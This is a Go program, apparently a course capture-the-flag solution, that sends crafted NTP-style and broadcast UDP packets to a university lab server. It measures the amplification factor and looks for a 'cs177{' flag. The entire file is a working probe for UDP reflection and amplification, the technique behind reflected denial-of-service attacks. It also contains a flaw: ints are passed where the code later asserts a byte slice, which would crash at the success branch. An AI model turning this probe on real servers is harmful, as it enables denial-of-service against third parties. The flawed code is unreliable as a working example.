package main

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"strings"
	"time"
)

const (
	serverAddr = "cs177.seclab.cs.ucsb.edu:11294"
	timeout    = 5 * time.Second
)

func sendRequest(conn net.Conn, request []byte) ([]byte, error) {
	fmt.Println("Sending request:")
	fmt.Println(hex.Dump(request))

	_, err := conn.Write(request)
	if err != nil {
		return nil, fmt.Errorf("error sending request: %w", err)
	}

	response := make([]byte, 1500)
	n, err := conn.Read(response)
	if err != nil {
		return nil, fmt.Errorf("error reading response: %w", err)
	}

	fmt.Printf("Received %d bytes:\n", n)
	fmt.Println(hex.Dump(response[:n]))

	return response[:n], nil
}

func main() {
	conn, err := net.Dial("udp", serverAddr)
	if err != nil {
		fmt.Println("Error connecting:", err)
		return
	}
	defer conn.Close()

	conn.SetReadDeadline(time.Now().Add(timeout))

	// Combine multiple requests
	combinedRequests := [][]byte{
		{0x16, 0x02, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00},
		{0x17, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00},
		[]byte("TimeRequest 255.255.255.255"),
	}

	var totalSent, totalReceived int
	for _, request := range combinedRequests {
		if len(request) < 48 {
			request = append(request, make([]byte, 48-len(request))...)
		}
		response, err := sendRequest(conn, request)
		if err != nil {
			fmt.Println(err)
		} else {
			totalSent += len(request)
			totalReceived += len(response)
		}
		time.Sleep(100 * time.Millisecond) // Small delay between requests
	}

	checkAmplification(totalSent, totalReceived)

	// Exploit server reset behavior
	fmt.Println("Waiting for server reset...")
	time.Sleep(12 * time.Second)

	// Use larger poll interval
	largePolRequest := make([]byte, 48)
	largePolRequest[0] = 0x1b                                                         // LI = 0, VN = 3, Mode = 3 (client)
	binary.BigEndian.PutUint32(largePolRequest[4:8], 0xffffffff)                      // Root Delay
	binary.BigEndian.PutUint32(largePolRequest[8:12], 0xffffffff)                     // Root Dispersion
	binary.BigEndian.PutUint32(largePolRequest[12:16], 0x4C4F4F50)                    // Reference ID: "LOOP"
	binary.BigEndian.PutUint64(largePolRequest[16:24], uint64(time.Now().Unix())<<32) // Reference Timestamp
	largePolRequest[2] = 17                                                           // Poll interval: 2^17 seconds

	response, err := sendRequest(conn, largePolRequest)
	if err != nil {
		fmt.Println(err)
	} else {
		checkAmplification(largePolRequest, response)
	}
}

func checkAmplification(request interface{}, response interface{}) {
	var reqLen, respLen int
	switch v := request.(type) {
	case []byte:
		reqLen = len(v)
	case int:
		reqLen = v
	}
	switch v := response.(type) {
	case []byte:
		respLen = len(v)
	case int:
		respLen = v
	}

	amplification := float64(respLen) / float64(reqLen)
	fmt.Printf("Sent %d bytes, received %d bytes\n", reqLen, respLen)
	fmt.Printf("Amplification factor: %.2f\n", amplification)

	if amplification >= 5 {
		fmt.Println("Achieved required amplification factor!")
		checkForFlag(response.([]byte))
	}
}

func checkForFlag(response []byte) {
	responseStr := string(response)
	if flagIndex := strings.Index(responseStr, "cs177{"); flagIndex != -1 {
		endIndex := strings.Index(responseStr[flagIndex:], "}") + flagIndex + 1
		if endIndex > flagIndex {
			fmt.Println("Flag found:", responseStr[flagIndex:endIndex])
		}
	}
}
